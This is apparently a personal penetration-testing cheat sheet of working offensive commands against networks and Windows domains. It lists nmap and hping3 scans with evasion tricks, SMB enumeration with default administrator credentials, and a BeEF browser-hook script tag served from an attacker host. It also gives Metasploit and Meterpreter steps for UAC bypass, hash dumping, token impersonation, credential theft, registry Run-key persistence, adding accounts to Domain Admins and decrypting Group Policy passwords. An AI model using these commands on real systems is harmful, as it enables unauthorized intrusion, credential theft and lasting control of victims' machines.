### ping sweep:
ICMP only (-PE istedet for -sn)
nmap -sn <range>

### Host discovery - no ping
nmap -n -sn -PS22,135,443,445 <range>

### DNS discovery
nmap -sS -sU -p 53 -n <range>

### Open/Closed/Filtered ports
hping3 -S -p 23,53,135 <IP>

### Portscan 
hping3 <IP> -S --scan known (TCP)
nmap sU <IP> (UDP)

### Sourceport
nmap -sS --source-port 53 -p 53 <range>
hping3 -S -s 53 -k -p 53 <ip>

### Idle scan:
hping3 -a <ip> -S -p 23 <ip>

### File shares:
nbtstat -a <IP> (win)
nmblookup -A <ip> (linux)

### Null session:
smbclient -L <ip>

### Enumerate shares and info:
nmap --script=smb-enum-users -p 445 10.130.40.70 --script-args
smbuser=administrator,smbpass=password

### BEEF:
Hook script: <script src="http://address:3000/hook.js"></script>

### Metasploit:
route add <range> <subnet>
auxiliary/scanner/smb/psexec_scanner - if hashes found
auxiliary/scanner/portscan/tcp
exploit/windows/local/bypassuac

### Meterpreter 
> If exploit timeout - check Priv esc via services
ipconfig
hashdump
#### use incognito
  list_tokens -u
	impersonate_token <name> (husk \\)

run autoroute -s <range>
portfwd add -l 8001 -p 80 -r <ip>
run arp_scanner -r <range> 
run winenum
run post/windows/gather/win_privs
run post/windows/gather/enum_applications (installed applications)
run post/multi/gather/filezilla_client_cred 
run post/windows/gather/enum_computers

run getgui -e
#### Maintain access:
  reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -d '"C:\inetpub\ftproot\msf_bind.exe"' -v msf_bind

load extapi
  adsi_computer_enum <domain>
	adsi_user_enum <domain>

#### shell
net user guest_1 guestpwd /add (/DOMAIN)
net localgroup "Remote Desktop Users" guest_1 /add (/DOMAIN)
net group "Domain Admins" ptester /ADD /DOMAIN
net start (installed services)
wmic service list brief
wmic service WHERE "NOT PathName LIKE '%system32%'" GET PathName,Name
icacls <folder> /grant Everyone:(F) /T

set

runas (minirunas)


Active Directory policies are stored in a special UNC path:
%USERDNSDOMAIN%\Policies

But you cannot access UNC paths via cmd, so you have to use the Sysvol share you can find
on a domain controller:
%LOGONSERVER%\Sysvol

gpp-decrypt 
